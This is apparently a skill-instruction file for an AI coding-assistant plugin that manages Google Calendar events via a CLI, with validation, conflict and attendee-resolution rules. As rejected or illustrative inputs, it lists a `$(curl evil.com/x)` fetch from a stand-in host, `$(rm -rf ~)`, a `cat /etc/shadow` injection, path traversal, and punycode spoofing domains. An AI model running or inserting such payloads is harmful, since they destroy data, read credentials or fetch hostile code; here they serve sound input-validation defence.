---
name: gevent
description: Google Calendar event management with Google Meet. Creates, updates, and cancels events via `npx @googleworkspace/cli`. Always attaches a configurable notes bot, checks for conflicts before creating, guards against past-time typos, and resolves attendee names against the shared `~/.claude/shared/identity.json` teammate roster (same file `/clickup` uses). Two-step onboarding writes `~/.claude/gevent/config.json` (calendar defaults + always-include list) and shares user + teammates with `/clickup`. Use when the user types `/gevent`, `/gevent:schedule`, `/gevent:schedule --auto`, `/gevent:onboard`, `/gevent:status`, `/gevent:calendar`, or says "schedule a call", "set up a meeting", "book a call with X", "move the meeting to Y", "cancel the Z call", or references a Google Meet / Calendar event.
user-invocable: false
---

# /gevent

Universal skill for scheduling, updating, and cancelling Google Calendar events. Enforces consistent title conventions, always attaches configured notes-bot attendees, and pulls teammates from the same shared roster `/clickup` uses — so names you've already taught `/clickup` just work here too.

Invocation forms (sub-commands map directly to the mode flags below):
- `/gevent` or `/gevent:schedule <seed>` — interactive create / update / cancel
- `/gevent:schedule --auto <seed>` — silent create with defaults
- `/gevent:onboard [identity|calendar]` — run the wizard
- `/gevent:status` — health-check both config files
- `/gevent:calendar` — switch active default calendar

## Step 1: Parse $ARGUMENTS

**L-17 — `$ARGUMENTS` shell-expansion awareness.** The `commands/*.md` shims pass `$ARGUMENTS` through verbatim. If the user's terminal expands `${HOME}`, backticks, `$(…)`, glob patterns, or history references BEFORE the plugin sees the text, the expansion result is what reaches Claude — NOT the literal characters the user typed. This is a shell-side behavior, not a plugin bug, but downstream parsing here MUST treat the resulting string as already-shell-processed. Concretely: if a user pastes `cancel /Users/...` the path is real; if they paste `$(curl evil.com/x)` and their shell ran it, `$ARGUMENTS` already holds the curl output. The skill never re-evaluates `$ARGUMENTS` as shell — but be aware that the value seen is post-expansion. Defense lives at the shell layer; the SKILL.md prose simply documents the boundary.

| Flag | Mode | Details |
|---|---|---|
| (none) | Interactive create / update / cancel | `references/modes.md#default` |
| `--auto` | Silent create with defaults | `references/modes.md#auto` |
| `--onboard` | Full wizard (identity + calendar) | `references/modes.md#onboard` |
| `--onboard identity` | Re-run shared identity wizard only | `references/modes.md#onboard-identity` |
| `--onboard calendar` | Re-run gevent-local wizard only | `references/modes.md#onboard-calendar` |
| `--status` | Config health check (both files) | `references/modes.md#status` |
| `--calendar` | Switch active calendar (primary ↔ other) | `references/modes.md#calendar` |

**Precedence on conflict:** `--onboard` > `--status` > `--calendar` > `--auto` > default. Flag arguments are space-separated (`--onboard identity`, not `--onboard=identity`). Positional args after flags are the call-seed text.

**L-10 — `--auto` + non-create verb early reject.** `--auto` is silent-create only. If the seed text matches the cancel-verb set (`cancel`, `delete`, `remove`) OR the update-verb set (`move`, `reschedule`, `change`, `update`, `add attendee`, `remove attendee`) — applying the M-7 precedence rule — refuse at parse time with a clear message rather than falling through to the safety-net "Title missing or empty" refuse:

```
/gevent:schedule --auto cancel the Sync
→ "--auto is create-only. For cancel use `/gevent:delete <event>`. For update use `/gevent:update <change>`. Refusing rather than silently dropping the verb."
```

Reject BEFORE attempting title extraction so the error message names the actual class of mistake.

## Step 2: Pre-flight (every invocation, in order)

**L-19 — mechanical pre-flight via `scripts/preflight.py` (REQUIRED first action).** Before evaluating ANY of the prose pre-flight steps below, run `python scripts/preflight.py` (resolved relative to the plugin root, e.g. `python plugins/gevent/scripts/preflight.py`). The script ships three mechanical invariants matching the prose:
- `detect_shadow_dirs()` — broad glob (canonical + `~/.claude.backup-*`, `~/.claude.bak/`, `~/.claude.old*/`, `~/.claude-backup-*`, `~/.claude-plugins-backup-*`).
- `validate_schema()` — `schemaVersion` int, `behavior.notes_bot_decided` strict bool, `always_include` array, `defaults.calendar` matches `CALENDAR_ID_RE` (M-4), `defaults.send_updates` / `duration_minutes` / `conference_type` (L-6).
- `auth_probe()` — runs `npx @googleworkspace/cli calendar calendars get` and applies the SKILL.md step 5 classifier (schema check + broadened error regex).

Exit codes: `0` all pass; `1` shadow hit (banner — non-fatal); `2` schema failed (HALT); `3` auth failed (HALT — re-auth); `4` script crashed. Run `python plugins/gevent/scripts/preflight.py` BEFORE step 1 below; if it exits non-zero, surface the script's stderr to the user and act per the exit code. The prose steps below are the fallback semantics for environments where Python is unavailable AND the documentation source-of-truth that the script implements.

1. **Shadow check FIRST (broadened glob — Migration Assistant / Time Machine / chezmoi / yadm dotfile-restore paths all covered).** Detect a shadowing legacy `create-call` skill via the union of these glob patterns AND the canonical path. The author already globs backup dirs for the legacy contacts loader at `references/modes.md` Step 7b — the shadow check uses the SAME globbing discipline so the two stay in lockstep:
   ```python
   import glob, pathlib
   home = pathlib.Path.home()
   patterns = [
       str(home / ".claude/skills/create-call"),                       # canonical legacy path
       str(home / ".claude.backup-*/skills/create-call"),              # macOS Migration Assistant / Time Machine restore
       str(home / ".claude.backup-*/skills-create-call"),              # alt naming used by some restore tools
       str(home / ".claude.bak/skills/create-call"),                   # common user rename
       str(home / ".claude.bak/skills-create-call"),
       str(home / ".claude.old*/skills/create-call"),                  # `.claude.old`, `.claude.old1`, `.claude.old-2026-04-24`
       str(home / ".claude.old*/skills-create-call"),
       str(home / ".claude-backup-*/skills/create-call"),              # dash-prefix variant (chezmoi default suffix)
       str(home / ".claude-backup-*/skills-create-call"),
       str(home / ".claude-plugins-backup-*/skills-create-call"),      # post-migration backup; see modes.md Step 7b
       str(home / ".claude-plugins-backup-*/skills/create-call"),
   ]
   shadow_hits = []
   for pat in patterns:
       shadow_hits += [p for p in glob.glob(pat) if pathlib.Path(p).is_dir()]
   ```
   If `shadow_hits` is non-empty, prepend a loud banner on every invocation until ALL hits are removed (banner enumerates every hit path, not just the first):
   > `⚠ Legacy user-level create-call skill detected at: <hit_1>, <hit_2>, … — this plugin is now called gevent. Remove with: rm -rf <each path>. Backups under ~/.claude.backup-*, ~/.claude.bak, ~/.claude.old*, ~/.claude-backup-* are caught here too.`
   
   Do not HALT — the plugin can still function (the user may have intentionally disabled model-invocation on the legacy skill). But the warning is non-dismissible until every hit directory is gone. Match `pathlib.is_dir()` rather than `is_file()` to avoid following stray symlinks. Glob expansion is intentionally NOT recursive (`**`) — bounded to one nested level to keep the pre-flight cheap on machines with deep `~/.claude.backup-*` trees.

2. **Read shared identity** from `~/.claude/shared/identity.json`. If missing or `onboarding_complete != true`:
   - **In `--auto` mode**: HALT with "identity missing — run `/gevent:onboard` first" (don't drag the user into interactive onboarding mid-auto).
   - In interactive mode: redirect to `--onboard identity` with one-line explanation; carry the original request as a call seed to resume after onboarding.

3. **Read gevent config** from `~/.claude/gevent/config.json`. If missing or `onboarding_complete != true`:
   - **In `--auto` mode**: HALT with "config missing — run `/gevent:onboard calendar` first".
   - In interactive mode: redirect to `--onboard calendar`; carry the seed.

3a. **Notes-bot preference gate (MANDATORY — strict JSON-schema type check, NOT a prose `!= true` substring read).** After the config loads, evaluate `behavior.notes_bot_decided` and `always_include` with explicit Python-level type assertions, NOT natural-language truthiness. The check below is load-bearing: migration tools (chezmoi, yadm, dotbot) routinely re-encode booleans as strings during dotfile sync, so a stringified `"true"` would slip past a prose `!= true` evaluation — but it MUST HALT.
   ```python
   v = data.get("behavior", {}).get("notes_bot_decided")
   if not (isinstance(v, bool) and v is True):
       fail("notes_bot_decided type-mismatch — must be JSON boolean true, "
            f"got {type(v).__name__}={v!r}; run `/gevent:onboard calendar`")
   ai = data.get("always_include")
   if not isinstance(ai, list):
       fail("always_include type-mismatch — must be JSON array, "
            f"got {type(ai).__name__}={ai!r}; run `/gevent:onboard calendar`")
   ```
   String `"true"`, integer `1`, float `1.0`, list `[true]`, or any other non-bool value HALTs with the type-mismatch message above. Likewise, a non-array `always_include` (object, string, null) HALTs even if `notes_bot_decided` is a valid bool.
   - **In `--auto` mode**: HALT with "notes-bot preference missing or wrong type — run `/gevent:onboard calendar` first".
   - In interactive mode: redirect to `--onboard calendar` (carry the seed). The wizard's notes-bot step (see `references/modes.md#onboard-calendar`) loops until the user picks one of three options and sets `behavior.notes_bot_decided: true` (JSON boolean, NOT string).
   - `always_include: []` (empty JSON array) is a valid state ONLY when `behavior.notes_bot_decided` passes the bool-true check (user explicitly chose "no bot"). An empty array without the flag, or a stringified `"[]"`, is NOT valid and triggers this gate.

4. **Validate schemaVersion** — both files must have integer `schemaVersion` ≤ the version this skill understands (currently `1`). On higher version: refuse to write, degrade to read-only with a banner. On corrupt JSON: quarantine to `<file>.corrupt-<epoch>` and re-onboard. (Enforced in code by the helper — see `references/config-schema.md` → `SchemaVersionTooNew`.)

5. **Verify Google Workspace CLI auth.** Capture BOTH stdout and stderr so real errors can be classified:
   ```
   out=$(npx @googleworkspace/cli calendar calendars get --params '{"calendarId":"primary"}' 2>/tmp/gws_stderr.$$); rc=$?; err=$(cat /tmp/gws_stderr.$$); rm -f /tmp/gws_stderr.$$
   ```
   Classify `rc` / `out` / `err` in this order (first match wins). **The "auth OK" branch is a schema check, NOT a prose heuristic** — JSON-shaped error bodies at HTTP 200 MUST fall through to re-auth:

   1. **Auth OK (schema check, not substring match).** `rc == 0` AND `out` parses as JSON AND the parsed object has key `id` AND does NOT have key `error`. Only then is auth considered valid. A response like `{"error":{"code":401,"message":"Unauthorized"}}` returned at HTTP 200 (observed on some proxy wrappers) has no `id` and HAS `error` — it fails this check and falls through to the re-auth branch below.
   2. **Re-auth required (broadened regex — matches stdout OR stderr, since some CLIs write errors to stdout).** If `out` parses as JSON AND has key `error` (covers HTTP-200-plus-error-body), OR `(err + out)` matches `/\b(401|403|407|5\d\d)\b|invalid.*credential|token.*expired|login required|unauthorized|forbidden|proxy authentication|ENOTFOUND|ECONNREFUSED|ECONNRESET|ETIMEDOUT|ENETUNREACH|EAI_AGAIN|certificate|self.signed|SSL|TLS|Fehler|ошибка/i` → HALT (do NOT retry, do NOT silent-swallow): "Google API auth or network failure detected. Run `! npx @googleworkspace/cli auth login --services calendar,people` and retry. Raw: `${err || out}`." HTTP 407 (proxy-auth), ENOTFOUND (DNS), ECONNREFUSED (transparent proxy), and localized error strings all land here.
   3. **Setup problem (CLI missing / npm not installed).** `(err + out)` matches `/command not found|npm ERR!|MODULE_NOT_FOUND|Cannot find module|E404|npx: not found/i` → HALT: "Google Workspace CLI not installed. Run `! npm i -g @googleworkspace/cli` (or `npx @googleworkspace/cli --help` to verify)."
   4. **Transient (explicit retry guidance, not silent).** `(err + out)` matches `/\brate limit\b|quotaExceeded|userRateLimitExceeded|backendError|temporarily unavailable/i` → HALT: "Google API transient error — retry in 30s. Raw: `${err || out}`."
   5. **Fallthrough — NEVER silent-pass.** Any other failure shape (empty stderr + non-JSON stdout, unclassified error) → HALT with `${err || out}` verbatim AND a re-auth pointer: "Unclassified CLI failure. If this persists, re-auth with `! npx @googleworkspace/cli auth login --services calendar,people`."

   The ordering is load-bearing: schema check runs BEFORE substring checks so an HTTP-200-plus-error-body never silent-passes as "auth OK." The regex match is against the CONCATENATION of stdout+stderr because different CLI versions and proxy wrappers split error text differently; matching only stderr misses stderr-on-stdout variants.

6. **Pending-seed resumption.** If a seed was carried from step 2 or step 3 (identity or calendar wizard just completed), resume default flow with that seed now.

## Step 3: Route by flag

Load the referenced section from `references/modes.md` before acting. Each mode has its own deterministic flow.

---

## Core rules (apply in EVERY mode that creates or edits an event)

Full rules + worked examples in `references/event-format.md`. Enforce:

**Title** — imperative or noun phrase. English. ≤120 chars. No bracket prefixes like `[Meeting]`, no `Re:`/`Fwd:`. If source names a project, include it naturally (not as a prefix).

**Description** — optional. If provided, short (1–3 lines). Include the meeting link + any referenced doc; nothing else.

**Timezone** — always use IANA names (`America/New_York`, `Europe/Kyiv`). Never hardcode `-04:00` / `-05:00` UTC offsets — Google handles DST.

**Attendees** — always start with the `always_include` list from `~/.claude/gevent/config.json` (typically the notes bot). Append user-requested attendees. **Never add the organizer** (`user.email` from identity.json) to the attendee list — Google auto-includes the organizer.

**Conference** — create Google Meet (`conferenceSolutionKey.type = "hangoutsMeet"`) unless user explicitly says "no video" or "phone only".

**Deduplication** — before creating, dedupe the attendee array by email (case-insensitive).

**Request ID** — derive from title-slug + millisecond timestamp + 6-char random suffix (e.g., `weekly-sync-1712505600123-a4f9c2`) so retries don't collide even at sub-second granularity. **L-1**: unix-second precision allowed two same-second `--auto` invocations of the same title to collide; millisecond + random suffix removes that. Retry-recovery uses `events list q=<title>` + exact-start-time match (NOT `requestId` search — `conferenceData.createRequest.requestId` is not indexed by Google's `q=` parameter, so the prior "search by requestId before retry" rule was unenforceable).

---

## Defaults (applied unless user overrides in preview)

All values read from `~/.claude/gevent/config.json` → `defaults` + `always_include`.

| Field | Default source | Override signal |
|---|---|---|
| Calendar | `defaults.calendar` (`primary`) | "on my work calendar" / "use team calendar" |
| Timezone | `defaults.timezone` (`America/New_York`) | "in Kyiv time" / "UTC" |
| Duration | `defaults.duration_minutes` (`30`) | "15 mins", "1 hour" |
| Send updates | `defaults.send_updates` (`all`) | "silent invite" → `none` |
| Conference | `defaults.conference_type` (`hangoutsMeet`) | "no video" → skip |
| Always-include | `always_include[]` (empty array = user opted out via onboarding; `behavior.notes_bot_decided` gates pre-flight) | "just me and Misha" → omit always-include |

---

## Resolution rules

### Attendee (dual-key resolver, teammates live in shared identity.json)

The roster lives in `~/.claude/shared/identity.json` under `teammates[]`. `/clickup` reads the same file — changes here are seen there.

**Homoglyph-collision gate (runs before every silent single-match AND before every zero-match upsert)**: compute the UTS #39 skeleton on the **RAW typed input, BEFORE the zero-width / BOM strip in step 1** (`unicodedata.normalize("NFKC", raw).casefold()` + confusables-map transform). Order is load-bearing: if the strip runs first, a BOM-prefixed record like `﻿Misha` collapses to `Misha` and skeleton-matches an existing `Misha` as identical bytes — the gate would never fire even though the distinct-record signal was the very BOM the strip just erased. Compute the skeleton BEFORE the strip, and compare BOTH the skeleton AND the raw byte-string to every existing teammate's skeleton+raw. If the skeleton matches an EXISTING teammate AND raw byte-strings differ (i.e. visually identical but distinct records), FORCE `AskUserQuestion` disambiguation — never silent-match. This gate ALSO runs on the zero-match upsert path (step 7 below) BEFORE a new teammate is written: compute the skeleton of the typed local-part AND the full email AND compare against every existing `teammates[].email` skeleton; on collision, FORCE `AskUserQuestion` disambiguation between the existing and proposed record — do NOT silent-upsert. Closes the documented "defense in depth" claim by extending it to the previously-uncovered zero-match-upsert path. Legitimate pure-script names (all-Cyrillic, all-Latin) never trigger this — no skeleton collision with anyone else. This precedence is load-bearing and overrides any "silent-allow" rule elsewhere — an external-domain email that happens to pass the review-gate silent-allow still hits this gate on resolution.

1. **FIRST**: compute raw-skeleton for the homoglyph gate above (RAW bytes, PRE-strip). **THEN**: NFC-normalize the typed name; strip leading/trailing whitespace (`re.sub(r"[\s​‌‍⁠﻿]+", "", ...)` — ASCII + zero-width + BOM); strip emoji. Use `str.casefold()` (NOT `.lower()`) for all case-insensitive comparisons (handles Turkish İ/i; German ß/ss correctly). Order matters: skeleton-on-raw BEFORE strip — if this order is violated, the BOM-prefix attack in the gate prose above slips through.
2. **First pass** — casefold match against `teammates[].latin_alias`.
3. **Second pass** — casefold + NFC match against `teammates[].first_name`.
4. **Third pass** — casefold match on `teammates[].email` (when user typed an email directly).
5. **Single match** → use that email.
6. **Multiple matches** → `AskUserQuestion` disambiguation (show full names + emails).
7. **Zero matches** → prompt for full email. Validate email against `^[^@\s"'\\<>]+@[^@\s"'\\<>]+\.[^@\s"'\\<>]+$` AND reject any domain with non-ASCII characters (IDNA mixed-script attack defense) AND reject any domain OR any domain-label that begins with `xn--` (IDN punycode rejection — `xn--pple-43d.com` is pure ASCII but unpacks to `аpple.com` with Cyrillic `а`, defeating the non-ASCII check on its own). THEN — BEFORE the upsert — run the homoglyph gate defined above on the zero-match path: compute the skeleton of the typed local-part AND the full email AND compare against every existing `teammates[].email` skeleton; on collision (raw bytes differ but skeletons match — e.g. Cyrillic-local-part `rаchel@corp.com` vs existing Latin-local-part `rachel@corp.com`), FORCE `AskUserQuestion` disambiguation between the existing and the proposed record. Do NOT silent-upsert. On failure, re-prompt with the reason. On valid email that passes ALL gates (regex + non-ASCII + `xn--` + skeleton-collision), upsert into `teammates[]` with `sources: ["manual"]` + `last_validated_at: null` via the atomic write helper in `references/config-schema.md`.
8. **Inactive teammate** (`active: false`) → surface banner, allow but confirm: "`X` is marked inactive (not in current ClickUp workspace). Still invite?"
9. In `--auto`: if ambiguous or attendee unresolvable AND no obvious default → refuse with one-line reason. **L-13 — explicit `--auto` rule on `active:false`**: an `active:false` teammate counts as **unresolvable under `--auto`** (refuse with `"Teammate <name> is marked active:false in identity.json — refusing to invite under --auto. Re-run interactively to override."`). The conservative reading wins because `--auto` cannot prompt for the "still invite?" confirmation; silent-inviting an ex-employee is the worst-of-both outcome.

### Calendar

Default is `primary` (the user's own Google account). Override via `--calendar` switch or per-invocation "on the team calendar." Calendar list lives in `~/.claude/gevent/config.json` → `defaults.calendar` and the optional `calendars[]` registry.

**`calendarId` validation regex (load-bearing — applied at pre-flight, BEFORE the value enters any `--params` JSON envelope, read-path or write-path).** Pin the regex:

```python
import re
CALENDAR_ID_RE = re.compile(r"^[a-zA-Z0-9._\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$|^primary$|^[a-f0-9]{24,}@group\.calendar\.google\.com$")

def validate_calendar_id(cal):
    if not isinstance(cal, str) or not CALENDAR_ID_RE.match(cal):
        raise SystemExit(
            f"calendarId rejected at pre-flight: {cal!r} does not match "
            r"^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$|^primary$|^[a-f0-9]{24,}@group\.calendar\.google\.com$. "
            "Run `/gevent:calendar` to pick a valid calendar."
        )
```

Hand-edited or untrusted values like `defaults.calendar: "../../etc/passwd"`, `defaults.calendar: "foo\"bar"`, `defaults.calendar: "$(rm -rf ~)"`, or `defaults.calendar: "; cat /etc/shadow #"` HALT at pre-flight with exit code 1 + the clear message above — the value never enters a JSON envelope, never reaches the CLI, never reaches Google. Accepted forms:
- `primary` — user's own account.
- `<email-format>@<domain>` — any RFC-shape calendar email.
- `<24+-hex>@group.calendar.google.com` — Google's secondary-calendar IDs.

The regex is intentionally narrower than the email-validation regex used for attendees (which accepts more punctuation) — calendar IDs come from Google and are well-shaped; permissive matching here is unnecessary and invites traversal-style payloads. The pre-flight check runs in `scripts/preflight.py` (see L-19) AND in SKILL.md step 3 prose at config-load time.

### Conflict detection (before create)

1. Query `npx @googleworkspace/cli calendar events list` for the proposed window — Cap at `maxResults:10` — the decision is "does ANY conflict exist in this window," not "enumerate every event on a heavy-traffic calendar." **Read-path tempfile discipline (parallel to `events insert` / `events patch`)**: the `--params` payload MUST be built in Python and passed via `--params-file <tempfile>` (or, on CLI versions that lack `--params-file`, via `--params "$(cat <tempfile>)"`). NEVER inline-substitute `<cal>`, `<start>`, `<end>` into a single-quoted shell string — a `calendarId` containing a quote (`foo\"bar`), backslash, or newline breaks the JSON envelope at the shell-quote boundary BEFORE Google sees it, and a `timeMin` carrying ANSI control sequences would re-emerge as shell-visible metacharacters. Same threat surface as the write path: `json.dump` is the only trusted serializer.
   ```python
   import json, tempfile
   params = {"calendarId": cal, "timeMin": start_iso, "timeMax": end_iso,
             "singleEvents": True, "orderBy": "startTime", "maxResults": 10}
   with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
       json.dump(params, f, ensure_ascii=False)  # auto-escapes quotes / backslashes / control chars
       params_file = f.name
   try:
       # bash:
       #   npx @googleworkspace/cli calendar events list \
       #     --params "$(cat $params_file)" 2>/dev/null
       ...
   finally:
       import os
       try: os.remove(params_file)
       except FileNotFoundError: pass
   ```
   This rule covers EVERY read path that takes `--params` JSON: `calendar events list`, `calendar events get`, `calendar calendarList list`, `calendar calendars get`, `calendar settings get`. A `calendarId` like `foo"bar` is REFUSED at the validation regex (see "Calendar" section below — M-4 regex catches it pre-flight); a value that the regex would somehow let through is still safely escaped by `json.dump`. Inline `--params '{"calendarId":"foo\"bar"}'` is FORBIDDEN — refused or escaped via tempfile, never substituted into a shell-quoted string.
2. If any event overlaps, surface in the preview: "You have `<title>` at `<time>`. Create anyway?" For each existing event in the window, classify and compute `overlap_minutes` per the math below, then sum ALL overlaps and compare against `proposed_minutes`.
3. **Overlap math (explicit, applied per-existing-event then summed).** Let `P_start`, `P_end` be the proposed event's resolved UTC datetimes; `proposed_minutes = max(0, (P_end - P_start).total_seconds() / 60)`. For each existing event `E` in the window:
   - **Timed event** (`E.start.dateTime` + `E.end.dateTime` present): `overlap_minutes_E = max(0, (min(P_end, E.end) - max(P_start, E.start)).total_seconds() / 60)`.
   - **All-day event** (`E.start.date` present, no `dateTime`): treat the entire all-day span as a 100%-overlap conflict — `overlap_minutes_E = proposed_minutes` (full coverage). Rationale: a calendar `date`-only field has no wall-clock, so we cannot timezone-resolve it safely across attendee zones; refusing to silently skip all-day events is the safe default. The all-day event is ALWAYS treated as conflicting for any proposed window that falls on or overlaps that date.
   - **Cumulative (multi-event) overlap.** Sum `overlap_minutes_E` across ALL events in the window — NOT the max, NOT just "any event overlaps." Three 20-minute events adjacent inside a 60-minute proposal produce `overlap_minutes_total = 60`, which is 100% overlap even though no single event covers ≥ 50% on its own.
4. **Zero-duration proposed event** (`P_end == P_start`, i.e. `proposed_minutes == 0`). Any existing event whose interval `[E.start, E.end)` STRICTLY contains `P_start`, OR any all-day event on that date, is a conflict — treat as 100% overlap (block under `--auto`). Do NOT divide by zero; the `max(1, proposed_minutes)` denominator below is ONLY for the percentage display — the zero-duration block decision is the direct "point-inside-interval" check.
5. **Percentage + auto-block rule.** `overlap_pct = overlap_minutes_total / max(1, proposed_minutes)`. In `--auto`: block creation if `overlap_pct >= 0.50` OR zero-duration-point-in-interval hit OR any all-day overlap is present. Surface "possible conflict" but proceed if `0 < overlap_pct < 0.50` and no all-day hit. In interactive mode, always surface in the preview regardless of threshold.

### Past-time guard

After parsing, if the resolved start is earlier than `now`:
- Interactive mode: `AskUserQuestion` "The time `<X>` has already passed today. Did you mean tomorrow?" Options: "yes, tomorrow" / "no, keep today".
- `--auto`: refuse with one-line reason. Never silently schedule in the past.

### Idempotency (retry safety)

Derive `requestId` = `<title-slug>-<unix-millis>-<6-char-random>` (e.g. `weekly-sync-1712505600123-a4f9c2`). Millisecond precision + random suffix prevents same-second collisions on `--auto` retries. On create failure mid-flight, search via `events list q=<title>` + exact-start-time match (NOT `requestId` lookup — Google's `q=` does not index `conferenceData.createRequest.requestId`, so the prior "search requestId before retry" rule was mechanically unenforceable). If a matching `(title, start-time)` event already exists, surface it instead of creating a duplicate. **L-1** addressed.

---

## `--auto` safety net (refuse conditions)

Refuse creation with a one-line reason when any of these hold:

- `~/.claude/shared/identity.json` missing or incomplete (pre-flight step 2 HALT)
- `~/.claude/gevent/config.json` missing or incomplete (pre-flight step 3 HALT)
- Notes-bot preference not yet decided (`behavior.notes_bot_decided != true` — pre-flight step 3a HALT)
- Google Workspace CLI not authenticated
- Title missing or empty after extraction
- Date or start time missing
- At least one attendee (beyond always-include) requested but unresolvable
- Resolved start time in the past
- Cumulative conflict overlap ≥ 50% of proposed duration (summed across all existing events in the window), OR zero-duration proposed time falls inside an existing event's interval, OR any all-day event exists on the proposed date — see "Conflict detection" above for math

The spirit of `--auto` is "save with whatever exists." If what exists is too little to produce a non-garbage event, refuse. `--auto` NEVER opens interactive onboarding or any `AskUserQuestion` prompt — if setup is incomplete, it HALTs with a clear one-liner pointing to the fix command.

---

## Preview + edit (interactive mode only)

Render compact draft in a monospace block:

```
Title:     <title>
Time:      <date> <start>–<end> <timezone> (<duration>)
Calendar:  <calendar name>
Attendees: <comma-separated names + notes bot>
Meet:      will be generated
[Conflicts: <title> at <time> — if any]
```

Offer: `[1] Confirm & create  [2] Edit field(s)  [3] Cancel`.

**Edit**: multi-select — user picks one or more fields; skill re-prompts only those. Mutations persist in a draft object (do NOT regenerate the preview from source — that silently reverts prior edits).

After any edit, redraw the preview and repeat. Cancel abandons the draft.

---

## Files (user state, OUTSIDE the plugin dir — survives `/plugin update`)

- `~/.claude/shared/identity.json` — **SHARED with `/clickup`**. User profile + teammate roster. Both skills read and append.
- `~/.claude/gevent/config.json` — gevent-local. Calendar defaults, always-include attendees, behavior flags.

All JSON writes use atomic `tmp + fsync + os.replace` under `fcntl.flock` on a sentinel file. The canonical identity.json lock is **`~/.claude/shared/identity.json.lock`** (NO leading dot — sibling of `identity.json`, not a dotfile). This path is the cross-plugin contract shared with `/clickup`; any deviation breaks mutual exclusion. See the reference helper in `references/config-schema.md`. Readers preserve unknown keys on rewrite (forward-compat with `/clickup` fields this plugin doesn't know about).

Schemas + examples in `references/config-schema.md`.

---

## Error handling

| Error | Response |
|---|---|
| 401 / 403 auth error | HALT: "Run `! npx @googleworkspace/cli auth login --services calendar,people`" |
| 404 event not found | "Event not found. Check the event ID or search by title." |
| 409 conflict | "Event may already exist. Search for it first." |
| Network error | "CLI connection failed. Check your internet connection." |
| Attendee not in roster | Prompt for full email; upsert into shared identity.json |
| Corrupt `identity.json` or `config.json` | Quarantine to `<file>.corrupt-<epoch>` and redirect to `--onboard` |

---

## See also

- `references/modes.md` — detailed flow for every mode
- `references/event-format.md` — title, time parsing, attendee conventions with examples
- `references/config-schema.md` — identity.json + gevent/config.json formats + atomic-write helper
